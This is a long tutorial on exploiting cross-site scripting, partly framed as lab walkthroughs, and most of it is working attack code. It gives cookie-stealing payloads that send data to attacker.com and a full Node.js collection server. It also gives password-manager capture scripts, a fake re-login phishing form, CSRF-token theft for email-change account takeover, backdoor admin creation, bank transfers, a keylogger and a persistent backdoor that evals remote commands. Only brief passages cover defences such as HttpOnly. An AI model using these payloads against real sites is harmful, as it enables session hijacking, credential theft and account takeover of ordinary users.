# Exploiting Cross-Site Scripting Vulnerabilities

Cross-site scripting exploitation goes far beyond simple proof-of-concept alerts—once an attacker achieves arbitrary JavaScript execution in a victim's browser within the context of a vulnerable application, they gain the ability to perform nearly any action the victim can perform, access any data the victim can access, and completely compromise the victim's interaction with the application. While security researchers traditionally use `alert()` or `alert(document.domain)` to demonstrate XSS vulnerabilities because it provides immediate, visible confirmation that JavaScript execution occurred on the target domain without causing harm, real-world attackers leverage XSS for sophisticated attacks including session hijacking through cookie theft, credential harvesting through password manager exploitation, account takeover via email changes combined with CSRF token extraction, keylogging to capture sensitive input, phishing through injected fake login forms, and malware distribution through browser exploitation. The power of XSS lies in the Same-Origin Policy bypass it provides—the malicious JavaScript executes with the full trust and privileges of the vulnerable website's origin, allowing it to read session cookies, access localStorage, make authenticated AJAX requests, read CSRF tokens from the DOM, and manipulate page content to deceive users, all while appearing to be legitimate activity from the trusted application.

The fundamental exploit capability: **XSS = arbitrary JavaScript execution with the target application's origin and the victim's privileges**.

## Proof of Concept with alert()

### Why use alert()?

**Traditional XSS proof of concept:**

```javascript
// Most basic proof
alert(1)

// Shows domain to prove origin
alert(document.domain)

// More descriptive
alert('XSS Vulnerability Confirmed')

// Shows cookie accessibility
alert(document.cookie)
```

**Why alert() is used:**

```
Advantages:
✓ Immediate visual confirmation
✓ Harmless (doesn't damage or steal data)
✓ Works in all browsers
✓ Requires no external infrastructure
✓ Cannot be missed by tester
✓ Short syntax (easy to inject)
✓ Proves JavaScript execution capability

Why not other functions:
console.log('XSS') → Requires opening DevTools, easy to miss
document.write('XSS') → Changes page, might break application
fetch('//attacker.com') → Needs external server, less obvious
```

**Modern alternatives to alert():**

```javascript
// Chrome 92+ blocks alert() in cross-origin iframes
// Use alternatives:

// Print dialog
print()

// Console output (check DevTools)
console.log('XSS confirmed')

// Debugger breakpoint
debugger;

// DOM manipulation
document.body.innerHTML = 'XSS Confirmed'

// Fetch to external server (best for blind XSS)
fetch('https://your-collaborator.com/xss-confirmed')
```

### Using alert(document.domain)

**Why specify document.domain:**

```javascript
// Basic alert
alert(1)
// Confirms: JavaScript executes
// Doesn't confirm: Which domain

// With domain
alert(document.domain)
// Confirms: JavaScript executes on specific domain
// Proves: Same-Origin Policy bypassed

Example scenarios:

Vulnerable site: example.com
Payload: alert(document.domain)
Alert shows: "example.com"
Proof: XSS executes on example.com origin

Vulnerable site with subdomain confusion:
Testing: sub.example.com
Payload reflects on: example.com
Alert shows: "example.com"
Clarifies: Where execution actually occurs
```

**Complete proof payloads:**

```html
<!-- HTML context -->
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>

<!-- Attribute context -->
" autofocus onfocus=alert(document.domain) x="

<!-- JavaScript string context -->
';alert(document.domain);//

<!-- Template literal context -->
${alert(document.domain)}

<!-- URL context -->
javascript:alert(document.domain)
```

## Stealing Cookies

### How cookie theft works

**Attack flow:**

```
Step 1: Attacker finds XSS vulnerability
Step 2: Crafts payload to exfiltrate cookies
Step 3: Delivers payload to victim (reflected) or stores it (stored XSS)
Step 4: Victim's browser executes malicious JavaScript
Step 5: JavaScript reads document.cookie
Step 6: Sends cookie to attacker-controlled server
Step 7: Attacker receives victim's session cookie
Step 8: Attacker manually injects cookie into their browser
Step 9: Attacker impersonates victim with hijacked session
```

### Basic cookie exfiltration payloads

**Method 1: Image beacon (simple and reliable):**

```javascript
<script>
// Create image, set src to attacker's server with cookie in URL
new Image().src = 'https://attacker.com/steal?cookie=' + document.cookie;
</script>

// Compact version
<script>new Image().src='//attacker.com/c?d='+document.cookie</script>

// Even more compact
<img src=x onerror="this.src='//attacker.com/c?d='+document.cookie">
```

**Method 2: Fetch API (modern, flexible):**

```javascript
<script>
fetch('https://attacker.com/steal', {
    method: 'POST',
    mode: 'no-cors',  // Bypass CORS for simple requests
    body: document.cookie
});
</script>

// With additional data
<script>
fetch('https://attacker.com/steal', {
    method: 'POST',
    mode: 'no-cors',
    body: JSON.stringify({
        cookie: document.cookie,
        url: location.href,
        user: document.querySelector('.username')?.textContent,
        timestamp: Date.now()
    })
});
</script>
```

**Method 3: XMLHttpRequest (legacy compatibility):**

```javascript
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://attacker.com/steal', true);
xhr.send(document.cookie);
</script>
```

**Method 4: Form submission:**

```javascript
<script>
var form = document.createElement('form');
form.method = 'POST';
form.action = 'https://attacker.com/steal';

var input = document.createElement('input');
input.name = 'cookie';
input.value = document.cookie;
form.appendChild(input);

document.body.appendChild(form);
form.submit();
</script>
```

**Method 5: WebSocket (bidirectional):**

```javascript
<script>
var ws = new WebSocket('wss://attacker.com/steal');
ws.onopen = function() {
    ws.send(JSON.stringify({
        cookie: document.cookie,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage)
    }));
};
</script>
```

### Attacker's collection server

**Simple logging server (Node.js/Express):**

```javascript
const express = require('express');
const fs = require('fs');
const app = express();

// Enable CORS to receive requests from any origin
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST');
    next();
});

// Cookie collection endpoint
app.get('/steal', (req, res) => {
    const cookie = req.query.cookie;
    const ip = req.ip;
    const userAgent = req.headers['user-agent'];
    const referer = req.headers['referer'] || 'Direct';
    
    // Log to console
    console.log('\n=== Cookie Stolen ===');
    console.log('Time:', new Date().toISOString());
    console.log('IP:', ip);
    console.log('User-Agent:', userAgent);
    console.log('Referer:', referer);
    console.log('Cookie:', cookie);
    console.log('====================\n');
    
    // Log to file
    const logEntry = `${new Date().toISOString()} | ${ip} | ${cookie}\n`;
    fs.appendFileSync('stolen_cookies.log', logEntry);
    
    // Return 1x1 transparent GIF (for image beacon method)
    res.set('Content-Type', 'image/gif');
    const gif = Buffer.from(
        'R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==',
        'base64'
    );
    res.send(gif);
});

// POST endpoint for more complex data
app.post('/steal', express.text({ type: '*/*' }), (req, res) => {
    console.log('Received data:', req.body);
    fs.appendFileSync('stolen_data.log', req.body + '\n\n');
    res.sendStatus(200);
});

app.listen(80, () => {
    console.log('Cookie stealer listening on port 80');
});
```

**Using stolen cookies:**

```javascript
// In attacker's browser on victim's site:

// Method 1: Developer Console
// Open DevTools (F12) on victim site
document.cookie = "session=STOLEN_SESSION_ID_HERE; path=/; domain=.victim-site.com";
location.reload();  // Reload to authenticate

// Method 2: EditThisCookie browser extension
// 1. Install EditThisCookie
// 2. Click extension icon
// 3. Import stolen cookie JSON
// 4. Refresh page

// Method 3: Manual cookie editing in browser DevTools
// Application tab → Cookies → Edit values

// Method 4: Burp Suite
// Proxy → Intercept → Replace Cookie header
Cookie: session=STOLEN_SESSION_ID
```

### Lab walkthrough: Exploiting XSS to steal cookies

**Scenario:** Blog with stored XSS in comment section, session cookies not HttpOnly

**Step 1: Identify XSS vulnerability**

```html
<!-- Post comment with test payload -->
Comment: <script>alert(1)</script>

<!-- If alert fires → XSS confirmed -->
```

**Step 2: Set up collection server**

```
Option 1: Use Burp Collaborator
- Automatically provided by Burp Suite
- Gives subdomain like: abc123.burpcollaborator.net
- Automatically logs HTTP requests

Option 2: Use exploit server (PortSwigger labs)
- Labs provide exploit server
- Access via "Go to exploit server" button
- URL like: exploit-abc123.exploit-server.net

Option 3: Your own server
- Set up simple HTTP server
- Public IP or ngrok tunnel
- Log incoming requests
```

**Step 3: Craft exfiltration payload**

```javascript
// Using lab exploit server
<script>
fetch('https://exploit-YOUR-ID.exploit-server.net/log?cookie=' + document.cookie);
</script>

// URL-encode for submission
%3Cscript%3Efetch%28%27https%3A%2F%2Fexploit-YOUR-ID.exploit-server.net%2Flog%3Fcookie%3D%27%2Bdocument.cookie%29%3B%3C%2Fscript%3E
```

**Step 4: Submit payload as comment**

```http
POST /post/comment HTTP/1.1
Host: vulnerable-blog.com

postId=1&comment=%3Cscript%3Efetch...&name=Attacker&email=test@test.com
```

**Step 5: Wait for victim to view post**

```
Lab simulates victim visiting post automatically
In real-world: Wait for legitimate user to view page
```

**Step 6: Check exploit server logs**

```
Exploit server → Access log

Look for requests to /log endpoint:
10.0.0.123 - - [18/Feb/2026:20:00:00] "GET /log?cookie=session=abc123xyz789 HTTP/1.1"

Extract session cookie: session=abc123xyz789
```

**Step 7: Use stolen cookie to access victim's account**

```
Method 1: Browser DevTools
1. Open victim site
2. F12 → Application → Cookies
3. Find 'session' cookie
4. Replace value with: abc123xyz789
5. Refresh page
6. Now logged in as victim

Method 2: Burp Suite
1. Intercept request to victim site
2. Modify Cookie header:
   Cookie: session=abc123xyz789
3. Forward request
4. Access victim's account
```

**Step 8: Submit solution (lab-specific)**

```
In PortSwigger labs:
- Access victim account
- View victim's API key or email
- Submit as solution
- Lab solved!
```

### Limitations of cookie theft

**Limitation 1: HttpOnly flag**

```javascript
// Server sets cookie with HttpOnly flag
Set-Cookie: session=abc123; HttpOnly; Secure

// JavaScript cannot access
console.log(document.cookie);
// Result: Empty or doesn't include HttpOnly cookies

// Mitigation effectiveness:
✓ Prevents document.cookie access
✓ Blocks most XSS cookie theft
✗ Doesn't prevent other XSS attacks (CSRF bypass, password capture, etc.)

// HttpOnly cookies still sent in requests:
fetch('/api/user/profile')  // Cookie automatically included
// But attacker's JavaScript can't read it
```

**Limitation 2: IP address locking**

```
Session tied to IP address:

Victim IP: 203.0.113.45
Session created: session=abc123 + IP 203.0.113.45

Attacker steals cookie from: 203.0.113.45
Attacker tries from: 198.51.100.89

Server validation:
- Receives: session=abc123
- Checks: Stored IP = 203.0.113.45
- Request from: 198.51.100.89
- IPs don't match → Session invalid → Logged out

Result: Cookie theft ineffective
```

**Limitation 3: Session timeout**

```
Typical session lifetime: 30 minutes to 24 hours

Attack timeline:
10:00 AM - Victim logs in (session created)
10:15 AM - Victim triggers XSS payload
10:16 AM - Attacker receives cookie
10:20 AM - Attacker tries to use cookie
          ✓ Still valid (within timeout)

Alternative timeline:
10:00 AM - Victim logs in
10:15 AM - Victim triggers XSS
10:16 AM - Attacker receives cookie
2:00 PM  - Attacker tries to use cookie (4 hours later)
          ✗ Session expired → Invalid

Mitigation: Quick action required after stealing
```

**Limitation 4: User not logged in**

```
Scenario: Victim visits site while logged out

XSS payload executes:
fetch('//attacker.com/steal?c=' + document.cookie);

Attacker receives:
Cookie: tracking=xyz; preferences=dark-mode

No session cookie → Cannot impersonate victim

Workaround: Persistent XSS waits for login
- Stored XSS remains on page
- Eventually victim logs in
- Session cookie created
- Next page load → Cookie stolen
```

**Limitation 5: Multi-factor authentication**

```
Attack flow:
1. Steal session cookie ✓
2. Use cookie to authenticate ✓
3. Site requires 2FA code ✗
4. Attacker doesn't have victim's phone/authenticator ✗

Mitigation effectiveness:
- Session cookie alone insufficient
- Requires additional factor
- Prevents simple session hijacking

Attacker options:
- Real-time attack (steal cookies + act immediately while victim authenticated)
- Phishing for 2FA codes
- Man-in-the-middle attack
- Different XSS exploits (account takeover via email change)
```

## Capturing Passwords

### Password manager exploitation

**How password managers work:**

```
Modern password managers:
- Store credentials for websites
- Auto-fill login forms on matching domains
- Detect input fields with type="password"
- Automatically populate username and password

Types:
- Browser built-in (Chrome, Firefox, Safari)
- Third-party extensions (LastPass, 1Password, Bitwarden)
- Operating system managers (iCloud Keychain, Windows Credential Manager)

Auto-fill behavior:
- Page loads with login form
- Password manager detects saved credentials
- Automatically fills username and password fields
- No user interaction required for many managers
```

### Injecting fake password fields

**Basic password capture payload:**

```javascript
<script>
// Create hidden password field
var pwdInput = document.createElement('input');
pwdInput.type = 'password';
pwdInput.name = 'password';
pwdInput.id = 'fake-password';
pwdInput.style.position = 'absolute';
pwdInput.style.left = '-9999px';  // Hide off-screen

// Add to page
document.body.appendChild(pwdInput);

// Wait for auto-fill
setTimeout(function() {
    // Read auto-filled value
    var password = pwdInput.value;
    
    if (password) {
        // Send to attacker
        fetch('https://attacker.com/pwd', {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify({
                password: password,
                url: location.href,
                timestamp: Date.now()
            })
        });
    }
}, 1000);  // Wait 1 second for auto-fill
</script>
```

**Visible phishing approach:**

```html
<script>
// Replace entire page with fake login form
document.body.innerHTML = `
    <div style="max-width: 400px; margin: 100px auto; padding: 40px; 
                border: 1px solid #ccc; border-radius: 8px; 
                background: white; box-shadow: 0 2px 10px rgba(0,0,0,0.1);">
        <h2 style="text-align: center; margin-bottom: 20px;">
            Session Expired
        </h2>
        <p style="text-align: center; color: #666; margin-bottom: 30px;">
            Please log in again to continue
        </p>
        <form id="phishing-form">
            <div style="margin-bottom: 15px;">
                <label>Email:</label>
                <input type="email" name="email" required 
                       style="width: 100%; padding: 10px; border: 1px solid #ddd; 
                              border-radius: 4px; font-size: 14px;">
            </div>
            <div style="margin-bottom: 20px;">
                <label>Password:</label>
                <input type="password" name="password" required
                       style="width: 100%; padding: 10px; border: 1px solid #ddd; 
                              border-radius: 4px; font-size: 14px;">
            </div>
            <button type="submit" 
                    style="width: 100%; padding: 12px; background: #007bff; 
                           color: white; border: none; border-radius: 4px; 
                           font-size: 16px; cursor: pointer;">
                Log In
            </button>
        </form>
    </div>
`;

// Intercept form submission
document.getElementById('phishing-form').addEventListener('submit', function(e) {
    e.preventDefault();
    
    var email = this.email.value;
    var password = this.password.value;
    
    // Send to attacker
    fetch('https://attacker.com/phish', {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify({
            email: email,
            password: password,
            site: location.hostname
        })
    }).then(() => {
        // Show error and reload to hide attack
        alert('Login failed. Please try again.');
        location.reload();
    });
});
</script>
```

### Lab walkthrough: Capturing passwords

**Scenario:** Blog with stored XSS, many users have password managers

**Step 1: Identify XSS**

```html
<!-- Test with basic payload -->
<script>alert(1)</script>

<!-- Confirm execution -->
```

**Step 2: Craft password capture payload**

```javascript
<script>
// Create username and password fields
var username = document.createElement('input');
username.type = 'text';
username.name = 'username';
username.id = 'fake-user';

var password = document.createElement('input');
password.type = 'password';
password.name = 'password';
password.id = 'fake-pwd';

// Hide fields
username.style.position = 'absolute';
username.style.left = '-9999px';
password.style.position = 'absolute';
password.style.left = '-9999px';

// Add to page
document.body.appendChild(username);
document.body.appendChild(password);

// Monitor for auto-fill
var checkInterval = setInterval(function() {
    if (password.value) {
        clearInterval(checkInterval);
        
        // Exfiltrate credentials
        fetch('https://exploit-YOUR-ID.exploit-server.net/log', {
            method: 'POST',
            mode: 'no-cors',
            body: 'username=' + username.value + '&password=' + password.value
        });
    }
}, 500);  // Check every 500ms
</script>
```

**Step 3: Submit as stored XSS**

```http
POST /post/comment HTTP/1.1

comment=<script>/* password capture code */</script>&name=Test
```

**Step 4: Wait for victim with password manager**

```
Lab simulates victim with auto-fill
Real-world: Wait for users with password managers
```

**Step 5: Retrieve captured password**

```
Check exploit server logs:
POST /log - username=carlos&password=montoya

Extracted credentials:
Username: carlos
Password: montoya
```

**Step 6: Log in as victim**

```
1. Navigate to login page
2. Enter captured credentials
3. Access victim account
4. Retrieve sensitive data (API key, etc.)
5. Submit solution
```

### Advantages over cookie theft

**Comparison:**

```
Cookie Theft Limitations:
✗ HttpOnly flag blocks access
✗ Session timeout
✗ IP address locking
✗ User might not be logged in
✗ 2FA protection

Password Capture Advantages:
✓ Gets actual password (not session)
✓ HttpOnly doesn't protect passwords
✓ No timeout issues (password doesn't expire)
✓ Works even if user logged out
✓ Can access from any IP
✓ Can use password on other sites (credential reuse)
✓ Bypasses 2FA on initial login from trusted device
✓ Long-term account access

Additional benefits:
✓ Can change email/password for persistence
✓ Password likely reused on other services
✓ Full account control
```

## Bypassing CSRF Protection

### Understanding CSRF protection

**Basic CSRF attack (without XSS):**

```html
<!-- Attacker's malicious site -->
<html>
<body>
    <h1>You won a prize!</h1>
    <form id="csrf-form" action="https://victim-bank.com/transfer" method="POST">
        <input type="hidden" name="to" value="attacker-account">
        <input type="hidden" name="amount" value="10000">
    </form>
    <script>
        document.getElementById('csrf-form').submit();
    </script>
</body>
</html>

<!-- When victim (logged into bank) visits attacker site:
1. Form auto-submits to bank
2. Browser includes victim's session cookie
3. Bank processes transfer
4. Money transferred to attacker

This is pure CSRF (one-way attack)
-->
```

**CSRF protection mechanisms:**

```
1. CSRF Tokens (most common)
   - Random token generated per session/request
   - Included in forms as hidden field
   - Server validates token on submission
   
   <form action="/transfer" method="POST">
       <input type="hidden" name="csrf_token" value="abc123xyz789">
       <input name="to" value="recipient">
       <input name="amount" value="100">
   </form>
   
   Attack fails because:
   - Attacker can't read victim's CSRF token
   - Same-Origin Policy blocks cross-origin reading
   - Token validation fails → Request rejected

2. SameSite cookies
   - Cookie attribute: SameSite=Strict or SameSite=Lax
   - Browser doesn't send cookie on cross-origin requests
   - Attacker's site can't make authenticated requests

3. Referer/Origin header validation
   - Server checks request came from own domain
   - Cross-origin requests have different Referer
```

### XSS enables CSRF bypass

**Why XSS defeats CSRF protection:**

```
CSRF protection assumes:
- Attacker on different origin
- Same-Origin Policy prevents reading responses
- Cannot access CSRF tokens

XSS breaks these assumptions:
✓ Malicious JavaScript runs on SAME origin as application
✓ Same-Origin Policy ALLOWS reading responses
✓ Can read CSRF tokens from page DOM
✓ Can make authenticated requests as victim
✓ Can read responses (two-way communication)

Traditional CSRF: One-way (send request, can't read response)
XSS + CSRF: Two-way (send request, read response, adapt attack)
```

### Reading CSRF tokens with XSS

**Method 1: Token in hidden form field**

```javascript
<script>
// Read CSRF token from form
var token = document.querySelector('input[name="csrf_token"]').value;

// Use token to make authenticated request
fetch('/user/change-email', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'email=attacker@evil.com&csrf_token=' + token
}).then(response => response.text())
  .then(data => {
      // Exfiltrate success confirmation
      fetch('https://attacker.com/success?email=changed');
  });
</script>
```

**Method 2: Token in meta tag**

```html
<!-- Some apps put CSRF token in meta tag -->
<meta name="csrf-token" content="abc123xyz789">

<script>
// Read from meta tag
var token = document.querySelector('meta[name="csrf-token"]').content;

// Use for requests
fetch('/api/sensitive-action', {
    method: 'POST',
    headers: {
        'X-CSRF-Token': token,  // Custom header with token
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({ action: 'malicious' })
});
</script>
```

**Method 3: Token retrieved via AJAX**

```javascript
<script>
// Fetch page containing CSRF token
fetch('/account/settings')
    .then(response => response.text())
    .then(html => {
        // Parse HTML to extract token
        var parser = new DOMParser();
        var doc = parser.parseFromString(html, 'text/html');
        var token = doc.querySelector('input[name="csrf_token"]').value;
        
        // Now perform attack with valid token
        return fetch('/account/change-email', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: 'email=attacker@evil.com&csrf_token=' + token
        });
    });
</script>
```

### Account takeover via email change

**Attack flow:**

```
Step 1: XSS payload executes on victim's browser
Step 2: Read CSRF token from page
Step 3: Change victim's email to attacker-controlled address
Step 4: Trigger password reset to new email
Step 5: Receive password reset link
Step 6: Reset password
Step 7: Full account access

Complete exploit:
```

```javascript
<script>
// Step 1: Read CSRF token
var token = document.querySelector('input[name="csrf_token"]').value;

// Step 2: Change email to attacker's
fetch('/account/update-email', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'email=attacker@evil.com&csrf_token=' + token
}).then(() => {
    // Step 3: Notify attacker of success
    fetch('https://attacker.com/email-changed?victim=' + document.querySelector('.username').textContent);
});

// Attacker's manual steps:
// 4. Visit password reset page
// 5. Enter victim's username
// 6. Reset email sent to attacker@evil.com
// 7. Click reset link
// 8. Set new password
// 9. Access victim's account
</script>
```

### Other CSRF bypass scenarios

**Scenario 1: Add administrator account**

```javascript
<script>
// If victim is admin
if (document.querySelector('.admin-panel')) {
    // Read CSRF token
    var token = document.querySelector('input[name="csrf"]').value;
    
    // Create new admin account for attacker
    fetch('/admin/users/create', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            username: 'backdoor_admin',
            password: 'P@ssw0rd123!',
            role: 'administrator',
            csrf_token: token
        })
    });
}
</script>
```

**Scenario 2: Modify API keys**

```javascript
<script>
var token = document.querySelector('input[name="csrf_token"]').value;

// Regenerate API key, send to attacker
fetch('/api/keys/regenerate', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'csrf_token=' + token
}).then(response => response.json())
  .then(data => {
      // Exfiltrate new API key
      fetch('https://attacker.com/keys', {
          method: 'POST',
          body: JSON.stringify({ apiKey: data.key })
      });
  });
</script>
```

**Scenario 3: Banking transfer**

```javascript
<script>
// Read token
fetch('/account/transfer-form')
    .then(r => r.text())
    .then(html => {
        var parser = new DOMParser();
        var doc = parser.parseFromString(html, 'text/html');
        var token = doc.querySelector('[name="csrf"]').value;
        
        // Perform transfer
        fetch('/account/transfer', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: `to=ATTACKER_ACCOUNT&amount=10000&csrf=${token}`
        });
    });
</script>
```

## Advanced Exploitation Techniques

### Keylogging

```javascript
<script>
var buffer = '';
var lastSend = Date.now();

document.addEventListener('keypress', function(e) {
    buffer += e.key;
    
    // Send every 20 chars or every 5 seconds
    if (buffer.length >= 20 || Date.now() - lastSend > 5000) {
        fetch('https://attacker.com/keys', {
            method: 'POST',
            mode: 'no-cors',
            body: buffer
        });
        buffer = '';
        lastSend = Date.now();
    }
});

// Ensure data sent on page unload
window.addEventListener('beforeunload', () => {
    if (buffer) navigator.sendBeacon('https://attacker.com/keys', buffer);
});
</script>
```

### Screen recording (limited)

```javascript
<script>
// Capture screenshots periodically
setInterval(function() {
    fetch('/api/sensitive-data')
        .then(r => r.text())
        .then(data => {
            fetch('https://attacker.com/data', {
                method: 'POST',
                body: data
            });
        });
}, 10000);  // Every 10 seconds
</script>
```

### Persistent backdoor

```javascript
<script>
// Install service worker for persistence (if XSS on main page)
if ('serviceWorker' in navigator) {
    navigator.serviceWorker.register('/attacker-sw.js');
}

// Or maintain persistence via localStorage
localStorage.setItem('backdoor', `
    setInterval(function() {
        fetch('https://attacker.com/command')
            .then(r => r.text())
            .then(cmd => eval(cmd));
    }, 30000);
`);

// Execute backdoor on page load
eval(localStorage.getItem('backdoor'));
</script>
```
